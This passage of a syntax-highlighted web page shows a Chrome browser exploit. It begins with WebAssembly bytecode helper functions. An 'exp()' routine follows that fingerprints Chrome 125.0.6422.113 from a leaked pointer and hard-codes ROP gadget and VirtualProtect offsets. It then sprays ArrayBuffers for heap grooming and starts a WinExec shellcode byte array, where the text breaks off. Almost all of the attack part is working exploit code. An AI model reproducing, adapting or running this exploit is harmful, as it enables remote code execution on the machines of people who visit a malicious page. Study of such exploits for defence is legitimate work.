          <span class="token comment">// If &#123;v&#125; sign-extended from 7 to 32 bits is equal to val, we are done.</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>BigInt<span class="token punctuation">.</span><span class="token function">asIntN</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> v<span class="token punctuation">)</span> <span class="token operator">==</span> val<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            res<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token function">Number</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> res<span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
          res<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token function">Number</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          val <span class="token operator">=</span> val <span class="token operator">>></span> <span class="token number">7n</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span>
          <span class="token string">"Leb value &lt;"</span> <span class="token operator">+</span> val <span class="token operator">+</span> <span class="token string">"> exceeds maximum length of "</span> <span class="token operator">+</span> max_len
        <span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">function</span> <span class="token function">wasmUnsignedLeb</span><span class="token punctuation">(</span><span class="token parameter">val<span class="token punctuation">,</span> max_len <span class="token operator">=</span> <span class="token number">5</span></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>val <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span>
          <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Leb value many not be null/undefined"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">let</span> res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> max_len<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">let</span> v <span class="token operator">=</span> val <span class="token operator">&amp;</span> <span class="token number">0x7f</span><span class="token punctuation">;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>v <span class="token operator">==</span> val<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            res<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> res<span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
          res<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>v <span class="token operator">|</span> <span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          val <span class="token operator">=</span> val <span class="token operator">>>></span> <span class="token number">7</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span>
          <span class="token string">"Leb value &lt;"</span> <span class="token operator">+</span> val <span class="token operator">+</span> <span class="token string">"> exceeds maximum length of "</span> <span class="token operator">+</span> max_len
        <span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">function</span> <span class="token function">wasmI32Const</span><span class="token punctuation">(</span><span class="token parameter">val</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token punctuation">[</span>kExprI32Const<span class="token punctuation">,</span> <span class="token operator">...</span><span class="token function">wasmSignedLeb</span><span class="token punctuation">(</span>val<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token comment">// Note: Since &#123;val&#125; is a JS number, the generated constant only has 53 bits of</span>
      <span class="token comment">// precision.</span>
      <span class="token keyword">function</span> <span class="token function">wasmI64Const</span><span class="token punctuation">(</span><span class="token parameter">val</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token punctuation">[</span>kExprI64Const<span class="token punctuation">,</span> <span class="token operator">...</span><span class="token function">wasmSignedLeb64</span><span class="token punctuation">(</span>val<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">function</span> <span class="token function">wasmF32Const</span><span class="token punctuation">(</span><span class="token parameter">f</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// Write in little-endian order at offset 0.</span>
        data_view<span class="token punctuation">.</span><span class="token function">setFloat32</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> f<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token punctuation">[</span>
          kExprF32Const<span class="token punctuation">,</span>
          byte_view<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
          byte_view<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
          byte_view<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
          byte_view<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
        <span class="token punctuation">]</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">function</span> <span class="token function">wasmF64Const</span><span class="token punctuation">(</span><span class="token parameter">f</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// Write in little-endian order at offset 0.</span>
        data_view<span class="token punctuation">.</span><span class="token function">setFloat64</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> f<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token punctuation">[</span>
          kExprF64Const<span class="token punctuation">,</span>
          byte_view<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
          byte_view<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
          byte_view<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
          byte_view<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
          byte_view<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
          byte_view<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
          byte_view<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
          byte_view<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
        <span class="token punctuation">]</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">function</span> <span class="token function">wasmS128Const</span><span class="token punctuation">(</span><span class="token parameter">f</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// Write in little-endian order at offset 0.</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>Array<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>f<span class="token punctuation">.</span>length <span class="token operator">!=</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"S128Const needs 16 bytes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> <span class="token punctuation">[</span>kSimdPrefix<span class="token punctuation">,</span> kExprS128Const<span class="token punctuation">,</span> <span class="token operator">...</span>f<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">let</span> result <span class="token operator">=</span> <span class="token punctuation">[</span>kSimdPrefix<span class="token punctuation">,</span> kExprS128Const<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>arguments<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            data_view<span class="token punctuation">.</span><span class="token function">setFloat64</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> arguments<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> result<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>byte_view<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>arguments<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            data_view<span class="token punctuation">.</span><span class="token function">setFloat32</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> arguments<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> result<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>byte_view<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span>
            <span class="token string">"S128Const needs an array of bytes, or two f64 values, "</span> <span class="token operator">+</span>
              <span class="token string">"or four f32 values"</span>
          <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> result<span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">let</span> <span class="token punctuation">[</span>wasmBrOnCast<span class="token punctuation">,</span> wasmBrOnCastFail<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token punctuation">[</span>
          <span class="token punctuation">(</span><span class="token parameter">labelIdx<span class="token punctuation">,</span> sourceType<span class="token punctuation">,</span> targetType</span><span class="token punctuation">)</span> <span class="token operator">=></span>
            <span class="token function">wasmBrOnCastImpl</span><span class="token punctuation">(</span>labelIdx<span class="token punctuation">,</span> sourceType<span class="token punctuation">,</span> targetType<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
          <span class="token punctuation">(</span><span class="token parameter">labelIdx<span class="token punctuation">,</span> sourceType<span class="token punctuation">,</span> targetType</span><span class="token punctuation">)</span> <span class="token operator">=></span>
            <span class="token function">wasmBrOnCastImpl</span><span class="token punctuation">(</span>labelIdx<span class="token punctuation">,</span> sourceType<span class="token punctuation">,</span> targetType<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">function</span> <span class="token function">wasmBrOnCastImpl</span><span class="token punctuation">(</span><span class="token parameter">labelIdx<span class="token punctuation">,</span> sourceType<span class="token punctuation">,</span> targetType<span class="token punctuation">,</span> brOnFail</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          labelIdx <span class="token operator">=</span> <span class="token function">wasmUnsignedLeb</span><span class="token punctuation">(</span>labelIdx<span class="token punctuation">,</span> kMaxVarInt32Size<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">let</span> srcHeap <span class="token operator">=</span> <span class="token function">wasmSignedLeb</span><span class="token punctuation">(</span>sourceType<span class="token punctuation">.</span>heap_type<span class="token punctuation">,</span> kMaxVarInt32Size<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">let</span> tgtHeap <span class="token operator">=</span> <span class="token function">wasmSignedLeb</span><span class="token punctuation">(</span>targetType<span class="token punctuation">.</span>heap_type<span class="token punctuation">,</span> kMaxVarInt32Size<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">let</span> srcIsNullable <span class="token operator">=</span> sourceType<span class="token punctuation">.</span>opcode <span class="token operator">==</span> kWasmRefNull<span class="token punctuation">;</span>
          <span class="token keyword">let</span> tgtIsNullable <span class="token operator">=</span> targetType<span class="token punctuation">.</span>opcode <span class="token operator">==</span> kWasmRefNull<span class="token punctuation">;</span>
          flags <span class="token operator">=</span> <span class="token punctuation">(</span>tgtIsNullable <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> srcIsNullable<span class="token punctuation">;</span>
          <span class="token keyword">return</span> <span class="token punctuation">[</span>
            kGCPrefix<span class="token punctuation">,</span>
            brOnFail <span class="token operator">?</span> kExprBrOnCastFailGeneric <span class="token operator">:</span> kExprBrOnCastGeneric<span class="token punctuation">,</span>
            flags<span class="token punctuation">,</span>
            <span class="token operator">...</span>labelIdx<span class="token punctuation">,</span>
            <span class="token operator">...</span>srcHeap<span class="token punctuation">,</span>
            <span class="token operator">...</span>tgtHeap<span class="token punctuation">,</span>
          <span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">function</span> <span class="token function">getOpcodeName</span><span class="token punctuation">(</span><span class="token parameter">opcode</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> globalThis<span class="token punctuation">.</span>kWasmOpcodeNames<span class="token operator">?.</span><span class="token punctuation">[</span>opcode<span class="token punctuation">]</span> <span class="token operator">??</span> <span class="token string">"unknown"</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token comment">// Make a wasm export "promising" using JS Promise Integration.</span>
      <span class="token keyword">function</span> <span class="token function">ToPromising</span><span class="token punctuation">(</span><span class="token parameter">wasm_export</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> sig <span class="token operator">=</span> wasm_export<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">assertTrue</span><span class="token punctuation">(</span>sig<span class="token punctuation">.</span>parameters<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">assertEquals</span><span class="token punctuation">(</span><span class="token string">"externref"</span><span class="token punctuation">,</span> sig<span class="token punctuation">.</span>parameters<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">let</span> wrapper_sig <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
          <span class="token literal-property property">parameters</span><span class="token operator">:</span> sig<span class="token punctuation">.</span>parameters<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
          <span class="token literal-property property">results</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"externref"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">WebAssembly<span class="token punctuation">.</span>Function</span><span class="token punctuation">(</span>wrapper_sig<span class="token punctuation">,</span> wasm_export<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
          <span class="token literal-property property">promising</span><span class="token operator">:</span> <span class="token string">"first"</span><span class="token punctuation">,</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
      <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">function</span> <span class="token function">checkUA</span><span class="token punctuation">(</span><span class="token parameter">chrome_leak</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>chrome_leak <span class="token operator">&amp;</span> <span class="token number">0xffffn</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0xfd00n</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            browser_type <span class="token operator">=</span> <span class="token string">"chrome"</span><span class="token punctuation">;</span>
            browser_version <span class="token operator">=</span> <span class="token string">"125.0.6422.113"</span><span class="token punctuation">;</span>
            base_leak_ofs <span class="token operator">=</span> <span class="token number">0xd39fd00n</span><span class="token punctuation">;</span>
            base_tgt_ofs <span class="token operator">=</span> <span class="token number">0xd35ffb8n</span><span class="token punctuation">;</span>
            fptr_xor <span class="token operator">=</span> <span class="token number">0xff000000000000n</span><span class="token punctuation">;</span>

            pivot_gadget <span class="token operator">=</span> <span class="token number">0x895558en</span><span class="token punctuation">;</span>
            pop_gadget <span class="token operator">=</span> <span class="token number">0x67620cn</span><span class="token punctuation">;</span>
            prax_ret <span class="token operator">=</span> <span class="token number">0x6cd1n</span><span class="token punctuation">;</span>
            jmp_drax <span class="token operator">=</span> <span class="token number">0x1d1e7n</span><span class="token punctuation">;</span>
            virtualprotect_iat_ofs <span class="token operator">=</span> <span class="token number">0xd214850n</span><span class="token punctuation">;</span>

            vtable_gadget <span class="token operator">=</span> <span class="token number">0x96b3672n</span><span class="token punctuation">;</span>
            vtable_rax <span class="token operator">=</span> <span class="token number">0xd4dab30n</span><span class="token punctuation">;</span>
            vtable_call_base <span class="token operator">=</span> <span class="token number">0xd3125e8n</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>

          <span class="token keyword">if</span> <span class="token punctuation">(</span>window<span class="token punctuation">.</span>browser_type <span class="token operator">===</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[!] checkUA() fail!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[*] navigator.userAgent = "</span> <span class="token operator">+</span> navigator<span class="token punctuation">.</span>userAgent<span class="token punctuation">)</span><span class="token punctuation">;</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[*] chrome_leak = "</span> <span class="token operator">+</span> chrome_leak<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>
              <span class="token string">"[+] checkUA() Browser: "</span> <span class="token operator">+</span>
                browser_type<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span>
                browser_type<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span>
                <span class="token string">" "</span> <span class="token operator">+</span>
                browser_version
            <span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token parameter">ms <span class="token operator">=</span> <span class="token number">50</span></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">await</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">r</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> ms<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">function</span> <span class="token function">hookLog</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">const</span> logTextarea <span class="token operator">=</span> window<span class="token punctuation">.</span>log<span class="token punctuation">;</span>
          <span class="token keyword">const</span> ConsoleLog <span class="token operator">=</span> console<span class="token punctuation">.</span>log<span class="token punctuation">;</span>
          console<span class="token punctuation">.</span>realLog <span class="token operator">=</span> ConsoleLog<span class="token punctuation">;</span>
          console<span class="token punctuation">.</span><span class="token function-variable function">log</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>args</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
            logTextarea<span class="token punctuation">.</span>value <span class="token operator">+=</span> args<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>
            <span class="token function">ConsoleLog</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>console<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token function">hookLog</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[*] UA:"</span><span class="token punctuation">,</span> navigator<span class="token punctuation">.</span>userAgent<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">const</span> nogc <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">const</span> abs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">let</span> absctr <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0x4000</span> <span class="token operator">/</span> <span class="token number">0x40</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          abs<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">new</span> <span class="token class-name">DataView</span><span class="token punctuation">(</span>abs<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setBigUint64</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x1337c0de1337da7an</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">const</span> ab <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">0x20000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">new</span> <span class="token class-name">DataView</span><span class="token punctuation">(</span>ab<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setBigUint64</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0xdeadbeefcafebaben</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">/*for (let i = 0; i &lt; 0x180000 / 0x20000; i++) &#123;
        nogc.push(new ArrayBuffer(0x20000));
    &#125;*/</span>

        <span class="token comment">// WinExec(sc+sc.len, 1)</span>
        <span class="token keyword">const</span> sc <span class="token operator">=</span> <span class="token punctuation">[</span>
          <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x83</span><span class="token punctuation">,</span> <span class="token number">0xec</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x83</span><span class="token punctuation">,</span> <span class="token number">0xe4</span><span class="token punctuation">,</span> <span class="token number">0xf0</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x83</span><span class="token punctuation">,</span> <span class="token number">0xec</span><span class="token punctuation">,</span>
          <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0xe8</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x89</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span>
          <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x8d</span><span class="token punctuation">,</span> <span class="token number">0x15</span><span class="token punctuation">,</span> <span class="token number">0xed</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x8b</span><span class="token punctuation">,</span> <span class="token number">0x4c</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span>
          <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0xe8</span><span class="token punctuation">,</span> <span class="token number">0x4a</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0xba</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>
